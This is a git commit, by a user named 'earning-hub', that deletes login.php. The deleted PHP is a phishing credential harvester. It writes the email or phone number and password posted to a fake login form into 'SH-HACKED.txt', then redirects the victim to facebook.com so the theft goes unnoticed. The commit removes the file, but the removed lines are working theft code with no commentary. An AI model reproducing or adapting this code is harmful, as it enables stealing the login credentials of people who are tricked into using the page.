eb54952afe39312b3b5853f184ffe845366251b9
earning-hub <111629056+earning-hub@users.noreply.github.com>
2022-08-27 09:23:20 +0600

    Delete login.php

--- login.php
+++
@@ -1,6 +0,0 @@
-<?php
- 
-file_put_contents("SH-HACKED.txt", "email/number " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/');
-exit();
- 
